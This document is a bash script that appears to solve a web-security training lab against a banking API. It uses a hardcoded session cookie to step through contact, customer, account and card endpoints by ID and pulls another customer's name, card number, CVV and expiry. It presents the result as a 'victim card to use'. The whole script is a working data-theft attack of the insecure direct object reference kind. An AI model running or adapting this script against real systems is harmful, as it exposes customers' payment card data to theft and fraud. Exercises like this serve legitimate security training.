#!/bin/bash

SESSION="3DARRjHZfDrTNJfoW5sF7pZStPjkPJhj8ZYYNlV6CHk.dbxiiWaqsUj96o9YBQuhd5syHbo"
BASE_URL="http://web0x06.hbtn"

echo "🎯 Récupération des données d'une carte victime..."

# Récupérer les contacts
CONTACTS=$(curl -s -H "Cookie: session=$SESSION" "$BASE_URL/api/contacts/list")

# Prendre le premier contact
FIRST_CUSTOMER_ID=$(echo "$CONTACTS" | grep -o '"customer_id":"[^"]*"' | head -1 | cut -d'"' -f4)

echo "Customer ID: $FIRST_CUSTOMER_ID"

# Récupérer ses infos
CUSTOMER_INFO=$(curl -s -H "Cookie: session=$SESSION" "$BASE_URL/api/customer/info/$FIRST_CUSTOMER_ID")

FIRSTNAME=$(echo "$CUSTOMER_INFO" | grep -o '"firstname":"[^"]*"' | cut -d'"' -f4)
LASTNAME=$(echo "$CUSTOMER_INFO" | grep -o '"lastname":"[^"]*"' | cut -d'"' -f4)

echo "Nom de la victime: $FIRSTNAME $LASTNAME"

# Récupérer son premier compte
ACCOUNT_ID=$(echo "$CUSTOMER_INFO" | grep -o '"accounts_id":\[[^]]*\]' | grep -o '"[a-f0-9]\{32\}"' | head -1 | tr -d '"')

echo "Account ID: $ACCOUNT_ID"

# Récupérer les infos du compte
ACCOUNT_INFO=$(curl -s -H "Cookie: session=$SESSION" "$BASE_URL/api/accounts/info/$ACCOUNT_ID")

# Récupérer sa première carte
CARD_ID=$(echo "$ACCOUNT_INFO" | grep -o '"cards_id":\[[^]]*\]' | grep -o '"[a-f0-9]\{32\}"' | head -1 | tr -d '"')

echo "Card ID: $CARD_ID"

# Récupérer les détails de la carte
CARD_INFO=$(curl -s -H "Cookie: session=$SESSION" "$BASE_URL/api/cards/info/$CARD_ID")

CARD_NUMBER=$(echo "$CARD_INFO" | grep -o '"number":"[^"]*"' | cut -d'"' -f4 | tail -1)
CARD_CVV=$(echo "$CARD_INFO" | grep -o '"cvv":"[^"]*"' | cut -d'"' -f4)
CARD_MONTH=$(echo "$CARD_INFO" | grep -o '"e_month":"[^"]*"' | cut -d'"' -f4)
CARD_YEAR=$(echo "$CARD_INFO" | grep -o '"e_year":"[^"]*"' | cut -d'"' -f4)
CARD_STATE=$(echo "$CARD_INFO" | grep -o '"state":"[^"]*"' | cut -d'"' -f4)

echo ""
echo "╔════════════════════════════════════════╗"
echo "║   CARTE VICTIME À UTILISER             ║"
echo "╚════════════════════════════════════════╝"
echo "Nom      : $FIRSTNAME $LASTNAME"
echo "Numéro   : $CARD_NUMBER"
echo "CVV      : $CARD_CVV"
echo "Expiration: $CARD_MONTH/$CARD_YEAR"
echo "État     : $CARD_STATE"
echo "Card ID  : $CARD_ID"
echo ""
